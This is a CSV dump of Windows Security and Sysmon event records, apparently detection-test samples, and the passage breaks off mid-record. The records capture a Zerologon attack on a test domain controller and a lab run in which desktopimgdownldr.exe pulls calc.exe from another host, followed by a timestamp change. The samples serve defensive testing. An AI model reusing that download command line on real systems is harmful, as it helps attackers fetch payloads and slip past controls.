22,22,2022-02-23 09:47:53.2416716,5,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3224,5464,dc1.test.local,0,S-1-5-18,Process terminated,TEST\Administrator,,"ProcessID: 5212, ProcessGUID: 3b58b388-02c1-6216-7801-000000000500",,,,,,C:\Windows\System32\dllhost.exe,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_Sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-02-23 09:47:53.240""},{""@Name"":""ProcessGuid"",""#text"":""3b58b388-02c1-6216-7801-000000000500""},{""@Name"":""ProcessId"",""#text"":""5212""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""User"",""#text"":""TEST\\Administrator""}]}}"
1,12551,2022-02-23 10:10:03.6023659,1102,Info,Microsoft-Windows-Eventlog,Security,300,1176,dc1.test.local,0,,Event log cleared,TEST\Administrator,,SID: (S-1-5-21-3684832485-3471852018-3987709081-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-3684832485-3471852018-3987709081-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""TEST"",""SubjectLogonId"":""0x67589""}}}"
2,12552,2022-02-23 10:10:06.0725901,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x86D358,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x86D358""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
3,12553,2022-02-23 10:10:06.0726600,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x86D358,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x86D358""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51373""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
4,12554,2022-02-23 10:10:06.0726755,4627,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x86D358""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""EventIdx"",""#text"":""1""},{""@Name"":""EventCountTotal"",""#text"":""1""},{""@Name"":""GroupMembership"",""#text"":"", %{S-1-5-32-544}, %{S-1-1-0}, %{S-1-5-32-554}, %{S-1-5-32-545}, %{S-1-5-32-560}, %{S-1-5-2}, %{S-1-5-11}, %{S-1-5-15}, %{S-1-5-21-3684832485-3471852018-3987709081-1000}, %{S-1-5-21-3684832485-3471852018-3987709081-516}, %{S-1-5-9}, %{S-1-18-1}, %{S-1-5-21-3684832485-3471852018-3987709081-572}, %{S-1-16-16384}""}]}}"
5,12555,2022-02-23 10:10:06.0733792,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x86D358,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x86D358""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
6,12556,2022-02-23 10:10:07.3584520,4742,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,A computer account was changed,NT AUTHORITY\ANONYMOUS LOGON,,Target: TEST\DC1$,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: 2022/02/23 19:10:07 AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: - DnsHostName: - ServicePrincipalNames: -,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ComputerAccountChange"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-7""},{""@Name"":""SubjectUserName"",""#text"":""ANONYMOUS LOGON""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E6""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""2022/02/23 19:10:07""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""},{""@Name"":""DnsHostName"",""#text"":""-""},{""@Name"":""ServicePrincipalNames"",""#text"":""-""}]}}"
7,12557,2022-02-23 10:10:12.1524084,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,6028,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x86D96C,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x86D96C""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
8,12558,2022-02-23 10:10:12.1525038,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,6028,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x86D96C,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x86D96C""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""911f63b0-1472-a510-d04d-3d51f11e5d46""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51374""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
9,12559,2022-02-23 10:10:12.1525196,4627,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,6028,dc1.test.local,0,,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x86D96C""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""EventIdx"",""#text"":""1""},{""@Name"":""EventCountTotal"",""#text"":""1""},{""@Name"":""GroupMembership"",""#text"":"", %{S-1-5-32-544}, %{S-1-1-0}, %{S-1-5-32-554}, %{S-1-5-32-545}, %{S-1-5-32-560}, %{S-1-5-2}, %{S-1-5-11}, %{S-1-5-15}, %{S-1-5-21-3684832485-3471852018-3987709081-1000}, %{S-1-5-21-3684832485-3471852018-3987709081-516}, %{S-1-5-9}, %{S-1-18-1}, %{S-1-5-21-3684832485-3471852018-3987709081-572}, %{S-1-16-16384}""}]}}"
10,12560,2022-02-23 10:10:22.8529344,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,6028,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x86D96C,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x86D96C""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
11,12561,2022-02-23 10:11:06.0731105,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x871F5E,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x871F5E""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
12,12562,2022-02-23 10:11:06.0731807,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x871F5E,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x871F5E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51377""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
13,12563,2022-02-23 10:11:06.0731962,4627,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x871F5E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""EventIdx"",""#text"":""1""},{""@Name"":""EventCountTotal"",""#text"":""1""},{""@Name"":""GroupMembership"",""#text"":"", %{S-1-5-32-544}, %{S-1-1-0}, %{S-1-5-32-554}, %{S-1-5-32-545}, %{S-1-5-32-560}, %{S-1-5-2}, %{S-1-5-11}, %{S-1-5-15}, %{S-1-5-21-3684832485-3471852018-3987709081-1000}, %{S-1-5-21-3684832485-3471852018-3987709081-516}, %{S-1-5-9}, %{S-1-18-1}, %{S-1-5-21-3684832485-3471852018-3987709081-572}, %{S-1-16-16384}""}]}}"
14,12564,2022-02-23 10:11:06.0747775,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,6028,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x871F5E,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsExtraLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x871F5E""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,1906,2022-08-29 05:35:43.1956698,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,Process creation,DESKTOP-VQBONAV\user,,"ProcessID: 60, ProcessGUID: 3e153517-502f-630c-db00-000000000500",RuleName: -,"MD5=0E8109FF251EE8C467F3F3641A2AFDDB,SHA256=AAADA36880E08C0B37ED6A1F6FF605144C650D987C0F8049347E9DD5A04CDB4E,IMPHASH=F8D617766CF1026390A712DFC1AE2EDA",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 312, ParentProcessGUID: 3e153517-4ee4-630c-ba00-000000000500","ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","""C:\Windows\system32\desktopimgdownldr.exe"" /lockscreenurl:http://192.168.158.128:8000/calc.exe /eventName:desktopimgdownldr",False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.167""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-502f-630c-db00-000000000500""},{""@Name"":""ProcessId"",""#text"":""60""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\desktopimgdownldr.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.18362.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""desktopimgdownldr.exe""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""desktopimgdownldr.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\system32\\desktopimgdownldr.exe\"" /lockscreenurl:http://192.168.158.128:8000/calc.exe /eventName:desktopimgdownldr""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""LogonGuid"",""#text"":""3e153517-4e00-630c-dbad-060000000000""},{""@Name"":""LogonId"",""#text"":""0x6ADDB""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""MD5=0E8109FF251EE8C467F3F3641A2AFDDB,SHA256=AAADA36880E08C0B37ED6A1F6FF605144C650D987C0F8049347E9DD5A04CDB4E,IMPHASH=F8D617766CF1026390A712DFC1AE2EDA""},{""@Name"":""ParentProcessGuid"",""#text"":""3e153517-4ee4-630c-ba00-000000000500""},{""@Name"":""ParentProcessId"",""#text"":""312""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" ""},{""@Name"":""ParentUser"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
2,1907,2022-08-29 05:35:43.1959301,10,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,ProcessAccess,SourceUser: DESKTOP-VQBONAV\user | TargetUser: DESKTOP-VQBONAV\user,,,GrantedAccess: Unknown code (0x1FFFFF),"SourceProcessID: 312, SourceProcessGUID: ",SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"TargetProcessID: 60, TargetProcessGUID: ",TargetImage: C:\Windows\system32\desktopimgdownldr.exe,CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d8d4|C:\Windows\System32\KERNELBASE.dll+5e4c0|C:\Windows\System32\KERNELBASE.dll+5c056|C:\Windows\System32\KERNEL32.DLL+1be93|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+383236|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+2c3809|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\d8eed133ae660904dfe3ed4521157cbc\System.ni.dll+2c3179|UNKNOWN(00007FFF9010F1A4),False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.188""},{""@Name"":""SourceProcessGUID"",""#text"":""3e153517-4ee4-630c-ba00-000000000500""},{""@Name"":""SourceProcessId"",""#text"":""312""},{""@Name"":""SourceThreadId"",""#text"":""3504""},{""@Name"":""SourceImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetProcessGUID"",""#text"":""3e153517-502f-630c-db00-000000000500""},{""@Name"":""TargetProcessId"",""#text"":""60""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\system32\\desktopimgdownldr.exe""},{""@Name"":""GrantedAccess"",""#text"":""0x1FFFFF""},{""@Name"":""CallTrace"",""#text"":""C:\\Windows\\SYSTEM32\\ntdll.dll+9d8d4|C:\\Windows\\System32\\KERNELBASE.dll+5e4c0|C:\\Windows\\System32\\KERNELBASE.dll+5c056|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+383236|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+2c3809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\d8eed133ae660904dfe3ed4521157cbc\\System.ni.dll+2c3179|UNKNOWN(00007FFF9010F1A4)""},{""@Name"":""SourceUser"",""#text"":""DESKTOP-VQBONAV\\user""},{""@Name"":""TargetUser"",""#text"":""DESKTOP-VQBONAV\\user""}]}}"
3,1908,2022-08-29 05:35:43.3684793,2,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,A process changed a file creation time,NT AUTHORITY\SYSTEM,,"ProcessID: 696, ProcessGUID: 3e153517-4dd2-630c-1400-000000000500",RuleName: T1099,Image: C:\Windows\system32\svchost.exe,TargetFilename: C:\Windows\Personalization\LockScreenImage\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe,CreationTimeUTC: 2022-05-29 08:04:04.000,PreviousCreationTimeUTC: 2022-08-29 05:35:43.344,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1099""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.359""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4dd2-630c-1400-000000000500""},{""@Name"":""ProcessId"",""#text"":""696""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Personalization\\LockScreenImage\\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-05-29 08:04:04.000""},{""@Name"":""PreviousCreationUtcTime"",""#text"":""2022-08-29 05:35:43.344""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
4,1909,2022-08-29 05:35:43.3686670,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 696, ProcessGUID: 3e153517-4dd2-630c-1400-000000000500",RuleName: EXE,Image: C:\Windows\system32\svchost.exe,TargetFilename: C:\Windows\Personalization\LockScreenImage\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.344""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4dd2-630c-1400-000000000500""},{""@Name"":""ProcessId"",""#text"":""696""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Personalization\\LockScreenImage\\LockScreenImage_MDzgqU41tUCy5HF14yvIg.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-08-29 05:35:43.344""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
5,1910,2022-08-29 05:35:43.3749745,27,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2256,3192,DESKTOP-VQBONAV,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Sysmon/Sysmon-27-BlockExeWrite_AbusingSvchost.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""ImageBlock""},{""@Name"":""UtcTime"",""#text"":""2022-08-29 05:35:43.359""},{""@Name"":""ProcessGuid"",""#text"":""3e153517-4dd2-630c-1400-000000000500""},{""@Name"":""ProcessId"",""#text"":""696""},{""@Name"":""User"",""#text"":""NT 